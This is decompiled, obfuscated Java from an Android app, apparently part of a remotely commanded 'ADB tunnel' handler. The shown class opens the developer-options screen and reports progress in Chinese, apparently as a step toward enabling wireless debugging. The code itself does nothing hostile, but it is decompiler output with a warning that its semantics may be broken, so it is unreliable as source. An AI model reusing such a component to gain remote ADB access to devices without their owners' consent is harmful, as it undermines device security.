package com.storm.safe.rock.service.modules.command;

import android.content.Intent;
import com.storm.safe.rock.service.dqtvuisjd;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler$handleOpenWifiDebugSettings$1", m214403f = "AdbTunnelCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class AdbTunnelCommandHandler$handleOpenWifiDebugSettings$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ uz0 f53412a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0343a0 f53413a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public AdbTunnelCommandHandler$handleOpenWifiDebugSettings$1(InterfaceC0876mv interfaceC0876mv, uz0 uz0Var, C0343a0 c0343a0) {
        super(2, interfaceC0876mv);
        this.f53412a1 = uz0Var;
        this.f53413a2 = c0343a0;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new AdbTunnelCommandHandler$handleOpenWifiDebugSettings$1(interfaceC0876mv, this.f53412a1, this.f53413a2);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        AdbTunnelCommandHandler$handleOpenWifiDebugSettings$1 adbTunnelCommandHandler$handleOpenWifiDebugSettings$1 = (AdbTunnelCommandHandler$handleOpenWifiDebugSettings$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        adbTunnelCommandHandler$handleOpenWifiDebugSettings$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        uz0 uz0Var = this.f53412a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            dqtvuisjd dqtvuisjdVar = uz0Var.f60536a0;
            C0343a0.m211874a4(uz0Var, "opening_settings", "正在打开无线调试设置...");
            Intent intent = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
            intent.addFlags(268435456);
            dqtvuisjdVar.startActivity(intent);
            C0343a0.m211874a4(uz0Var, "settings_opened", "已打开开发者选项");
        } catch (Exception e) {
            t60.m214705c6("AdbTunnelCmdHandler", "打开设置失败", e);
            C0343a0.m211874a4(uz0Var, "open_failed", "打开设置失败: " + e.getMessage());
        }
        return C1351vv.f60710b1;
    }
}
